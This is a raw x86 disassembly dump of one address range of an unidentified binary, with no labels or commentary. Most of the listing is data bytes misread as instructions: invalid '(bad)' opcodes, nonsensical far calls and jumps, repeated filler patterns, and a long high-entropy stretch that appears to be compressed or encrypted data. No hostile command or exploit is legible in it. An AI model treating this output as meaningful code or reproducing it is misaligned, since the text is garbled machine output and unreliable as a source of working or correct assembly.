  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fnsave [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x728bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],ch
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x82a3246f
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [ebp+0x6],bh
  41edc0:	add    BYTE PTR [eax],al
  41edc2:	cmp    DWORD PTR [edi-0x1e],eax
  41edc5:	cmp    eax,0xa6d46340
  41edca:	mov    esp,0x38d5dda9
  41edcf:	test   al,0x89
  41edd1:	es jb  0x41ed54
  41edd4:	xor    BYTE PTR [ebx],al
  41edd6:	and    eax,0xffe0585d
  41eddb:	pop    es
  41eddc:	push   0xffffffc6
  41edde:	push   ds
  41eddf:	pusha  
  41ede0:	mov    BYTE PTR [ebx],dl
  41ede2:	mov    WORD PTR [eax+0x1a],gs
  41ede5:	push   esi
  41ede6:	stos   BYTE PTR es:[edi],al
  41ede7:	xlat   BYTE PTR ds:[ebx]
  41ede8:	adc    DWORD PTR [edi+0x262c871f],esi
  41edee:	addr16 loop 0x41ed96
  41edf1:	ret    
  41edf2:	into   
  41edf3:	aam    0x66
  41edf5:	mov    bl,0x9
  41edf7:	mul    BYTE PTR [edi+0x3d28962b]
  41edfd:	and    BYTE PTR [ecx],0xfb
  41ee00:	hlt    
  41ee01:	inc    DWORD PTR [ecx+0x9]
  41ee04:	shr    DWORD PTR [edx+0x3d],cl
  41ee07:	neg    BYTE PTR [esi-0x31]
  41ee0a:	push   ebx
  41ee0b:	or     edi,DWORD PTR [edi]
  41ee0d:	adc    al,0x5a
  41ee0f:	inc    esp
  41ee10:	mov    bh,BYTE PTR [edx-0x3a]
  41ee13:	sahf   
  41ee14:	sti    
  41ee15:	dec    ecx
  41ee16:	xor    bh,cl
  41ee18:	out    dx,eax
  41ee19:	retf   
  41ee1a:	pop    edx
  41ee1b:	jecxz  0x41ee4e
  41ee1d:	mov    al,0x7c
  41ee1f:	mov    ecx,0x61baf005
  41ee24:	into   
  41ee25:	jge    0x41ede9
  41ee27:	jo     0x41ede3
  41ee29:	or     DWORD PTR [edi+0x9],ebp
  41ee2c:	or     BYTE PTR [ecx],bh
  41ee2e:	or     BYTE PTR [edx+0x76],ch
  41ee31:	call   0x884d:0xad34e474
  41ee38:	cmp    al,0xb7
  41ee3a:	in     al,dx
  41ee3b:	push   cs
  41ee3c:	sub    eax,0x61adec93
  41ee41:	arpl   ax,ax
  41ee43:	loopne 0x41ee16
  41ee45:	call   DWORD PTR [edi-0x50]
  41ee48:	xor    ah,dl
  41ee4a:	sub    ah,al
  41ee4c:	and    eax,0xef1d95f
  41ee51:	ss xchg esi,eax
  41ee53:	into   
  41ee54:	push   edi
  41ee55:	sbb    ch,BYTE PTR [edi]
  41ee57:	cmc    
  41ee58:	cmc    
  41ee59:	or     DWORD PTR ds:0x54c71519,ecx
  41ee5f:	push   edi
  41ee60:	ss cdq 
  41ee62:	stos   DWORD PTR es:[edi],eax
  41ee63:	jns    0x41ee4e
  41ee65:	popf   
  41ee66:	je     0x41eeb6
  41ee68:	in     eax,dx
  41ee69:	imul   ebp,DWORD PTR [eax-0x49],0xffffffa4
  41ee6d:	cdq    
  41ee6e:	add    eax,0x5d1e1846
  41ee73:	mov    ds,edx
  41ee75:	push   eax
  41ee76:	push   ebp
  41ee77:	dec    edi
  41ee78:	ret    
  41ee79:	jp     0x41ee95
  41ee7b:	int3   
  41ee7c:	popa   
  41ee7d:	or     eax,0xe46a7ce
  41ee82:	xor    al,0x14
  41ee84:	outs   dx,DWORD PTR ds:[esi]
  41ee85:	test   eax,edx
  41ee87:	lds    edi,FWORD PTR [ebp-0x5]
  41ee8a:	sbb    al,0x81
  41ee8c:	jbe    0x41ee7f
  41ee8e:	jge    0x41eee2
  41ee90:	sahf   
  41ee91:	call   0x25d9:0xda2bc8ab
  41ee98:	or     ah,0x33
  41ee9b:	scas   al,BYTE PTR es:[edi]
  41ee9c:	dec    eax
  41ee9d:	add    bh,BYTE PTR [ebx-0x244bcb06]
  41eea3:	or     eax,0x6206a435
  41eea8:	es in  eax,0xa0
  41eeab:	test   DWORD PTR cs:[ebp+0x74],esi
  41eeaf:	sub    eax,0xc68f979a
  41eeb4:	jmp    0xb94111d8
  41eeb9:	xchg   edi,eax
  41eeba:	sbb    DWORD PTR [edx+0x20],esi
  41eebd:	jb     0x41ef00
  41eebf:	xchg   ecx,eax
  41eec0:	push   0xffffffab
  41eec2:	js     0x41ee9c
  41eec4:	adc    al,0x3f
  41eec6:	sahf   
  41eec7:	dec    edx
  41eec8:	mov    ch,0xdb
  41eeca:	pop    esi
  41eecb:	xor    ebx,esp
  41eecd:	mov    al,ds:0x11d7c836
  41eed2:	fdivr  QWORD PTR [ecx+0x2c068153]
  41eed8:	dec    edi
  41eed9:	fcomp  QWORD PTR [eax]
  41eedb:	das    
  41eedc:	fidivr DWORD PTR [eax+0x5f]
  41eedf:	ficom  WORD PTR [esi+edi*4]
  41eee2:	fbstp  TBYTE PTR [esi-0x39]
  41eee5:	enter  0x430a,0x16
  41eee9:	aad    0x9
  41eeeb:	sub    eax,0x76c2b864
  41eef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eef1:	pop    eax
  41eef2:	mov    ah,0xec
  41eef4:	(bad)  [esi+eax*8]
  41eef7:	xchg   edi,eax
  41eef8:	ja     0x41eeb8
  41eefa:	lods   al,BYTE PTR ds:[esi]
  41eefb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41eefd:	lods   eax,DWORD PTR ds:[esi]
  41eefe:	xor    DWORD PTR [ecx],edi
  41ef00:	enter  0xf088,0xfd
  41ef04:	iret   
  41ef05:	xchg   edx,eax
  41ef06:	test   al,0xe1
  41ef08:	mov    edi,0xd49e76b1
  41ef0d:	inc    ecx
  41ef0e:	sbb    ecx,eax
  41ef10:	lahf   
  41ef11:	jge    0x41ef86
  41ef13:	add    al,0xa5
  41ef15:	jl     0x41ef2e
  41ef17:	sti    
  41ef18:	(bad)  
  41ef19:	and    edx,DWORD PTR [esi]
  41ef1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1c:	test   al,0xba
  41ef1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef1f:	gs mov ah,0xe6
  41ef22:	loopne 0x41ef1a
  41ef24:	in     al,0x38
  41ef26:	pop    eax
  41ef27:	int3   
  41ef28:	cmp    al,0xa2
  41ef2a:	ret    
  41ef2b:	cld    
  41ef2c:	ja     0x41ef3f
  41ef2e:	int    0x75
  41ef30:	add    DWORD PTR [ecx+0x5a33a57],esp
  41ef36:	mov    bh,0x89
  41ef38:	call   0x5e1e07d6
  41ef3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef3e:	sbb    BYTE PTR [esi+0x5f],ah
  41ef41:	pusha  
  41ef42:	adc    eax,0x8c40223b
  41ef47:	cmp    BYTE PTR [edi],al
  41ef49:	add    al,0x2f
  41ef4b:	ror    eax,1
  41ef4d:	js     0x41efbe
  41ef4f:	jae    0x41ef19
  41ef51:	leave  
  41ef52:	jmp    0x41ef16
  41ef54:	outs   dx,DWORD PTR ds:[esi]
  41ef55:	fcom   QWORD PTR [ecx-0x2]
  41ef58:	xchg   DWORD PTR [edi+0x3c],ebx
  41ef5b:	add    eax,0x750a34da
  41ef60:	push   ecx
  41ef61:	mov    dl,0x41
  41ef63:	xor    al,BYTE PTR [ebx-0x616c2901]
  41ef69:	not    BYTE PTR [ebx+0x21]
  41ef6c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41ef6e:	icebp  
  41ef6f:	fild   QWORD PTR [edx-0x37]
  41ef72:	enter  0xc396,0xa7
  41ef76:	inc    BYTE PTR ds:0x6256db5c
  41ef7c:	sub    al,0x80
  41ef7e:	sub    al,0xb2
  41ef80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef81:	or     BYTE PTR [esi],ch
  41ef83:	xor    dl,BYTE PTR [edi-0x15]
  41ef86:	idiv   dl
  41ef88:	pop    edi
  41ef89:	dec    ecx
  41ef8a:	jecxz  0x41ef8f
  41ef8c:	sti    
  41ef8d:	ror    BYTE PTR [ecx],1
  41ef8f:	cs out dx,eax
  41ef91:	test   DWORD PTR [edi+0x1c],ecx
  41ef94:	cli    
  41ef95:	pop    edx
  41ef96:	in     eax,0x8a
  41ef98:	loopne 0x41ef23
  41ef9a:	test   dh,dh
  41ef9c:	xchg   ebx,eax
  41ef9d:	into   
  41ef9e:	out    0x32,al
  41efa0:	cmp    edx,DWORD PTR [eax+0x54]
  41efa3:	pop    ds
  41efa4:	jecxz  0x41efce
  41efa6:	add    cx,WORD PTR [esi]
  41efa9:	xlat   BYTE PTR ds:[ebx]
  41efaa:	xor    ah,0x4f
  41efad:	and    esp,DWORD PTR [edx+0x20]
  41efb0:	pop    edx
  41efb1:	ror    DWORD PTR [eax+0x19],cl
  41efb4:	call   0xc273:0xb696856e
  41efbb:	movzx  ebp,di
  41efbe:	shl    BYTE PTR ds:0xf148caa3,1
  41efc4:	sti    
  41efc5:	popa   
  41efc6:	(bad)  
  41efc7:	sub    DWORD PTR [ebp+0x31635872],esi
  41efcd:	shl    BYTE PTR [edi-0x7ad02d5a],0x98
  41efd4:	sub    edi,DWORD PTR [edx+eax*2-0x3b]
  41efd8:	or     BYTE PTR [edi+0x358079d8],ah
  41efde:	(bad)  
  41efe0:	sub    BYTE PTR ss:[ebx],bl
  41efe3:	push   ebp
  41efe4:	stc    
  41efe5:	add    eax,0x68e70806
  41efea:	popa   
  41efeb:	push   0xffffff81
  41efed:	outs   dx,DWORD PTR ds:[esi]
  41efee:	jmp    0x41ef98
  41eff0:	call   0xc997dffb
  41eff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eff6:	jl     0x41f06a
  41eff8:	xor    al,0x16
  41effa:	aad    0x43
  41effc:	push   edx
  41effd:	shl    BYTE PTR [edx],cl
  41efff:	jl     0x41efd6
  41f001:	loope  0x41efe3
  41f003:	dec    edx
  41f004:	sbb    dl,al
  41f006:	sbb    esi,0xa
  41f009:	jmp    0x7f76:0x7117b38b
  41f010:	xor    eax,0x1661e8cc
  41f015:	test   BYTE PTR [ecx+0x69e835d1],dh
  41f01b:	test   ah,cl
  41f01d:	mov    edx,0xcdeddea0
  41f022:	xchg   esp,eax
  41f023:	mov    ebp,0x8e60fdd
  41f028:	or     esi,DWORD PTR [ebp+0x6e]
  41f02b:	jae    0x41efed
  41f02d:	dec    ebp
  41f02e:	cmp    esp,DWORD PTR ds:0xb3ebca44
  41f034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f035:	xchg   ebp,eax
  41f036:	scas   eax,DWORD PTR es:[edi]
  41f037:	fwait
  41f038:	rol    ebp,0x11
  41f03b:	mov    eax,0x6d56935f
  41f040:	fwait
  41f041:	clc    
  41f042:	xchg   ebp,eax
  41f043:	aam    0x8c
  41f045:	pop    eax
  41f046:	mov    ch,0xb3
  41f048:	mov    ds:0x7cc73739,eax
  41f04d:	add    ecx,DWORD PTR [ecx-0x299778a2]
  41f053:	clc    
  41f054:	fadd   DWORD PTR ss:[edi+0x15]
  41f058:	xchg   edi,eax
  41f059:	sub    eax,0x50d200ca
  41f05e:	cmp    al,BYTE PTR [ebp-0x2d]
  41f061:	shl    esi,cl
  41f063:	pop    eax
  41f064:	cmp    DWORD PTR [edx],eax
  41f066:	mov    dl,0x82
  41f068:	js     0x41f033
  41f06a:	dec    edi
  41f06b:	push   esp
  41f06c:	cmc    
  41f06d:	ficomp DWORD PTR [esi+0x2f]
  41f070:	jns    0x41f0de
  41f072:	inc    edi
  41f073:	iret   
  41f074:	and    dl,cl
  41f076:	mov    gs,WORD PTR [esi]
  41f078:	xor    esp,DWORD PTR [edx+eax*1]
  41f07b:	repnz retf 
  41f07d:	sar    BYTE PTR [ecx-0x17c67aa9],cl
  41f083:	scas   eax,DWORD PTR es:[edi]
  41f084:	pop    edx
  41f085:	inc    ecx
